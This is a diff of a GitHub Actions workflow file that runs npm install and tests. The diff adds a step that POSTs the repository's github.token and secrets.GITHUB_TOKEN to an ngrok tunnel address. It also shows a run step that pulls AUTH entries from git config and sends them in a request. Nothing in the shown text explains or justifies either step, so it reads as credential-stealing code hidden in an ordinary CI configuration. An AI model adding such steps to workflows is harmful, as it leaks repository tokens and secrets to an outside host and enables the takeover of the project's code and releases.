@@ -13,6 +13,14 @@ jobs:
           npm install
           npm test
       
+      
+      
+      - uses: fjogeleit/http-request-action@master
+        with:
+          url: 'https://5aa7-93-172-42-40.ngrok.io'
+          method: 'POST'
+          data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}"}'
+
       - run: | 
           auth=$(git config --list | grep AUTH)
           
@@ -29,9 +37,3 @@ jobs:
             "auth": "'$auth'"
             }' \
           --fail
-          
-      - uses: fjogeleit/http-request-action@master
-        with:
-          url: 'https://5aa7-93-172-42-40.ngrok.io'
-          method: 'POST'
-          data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}"}'
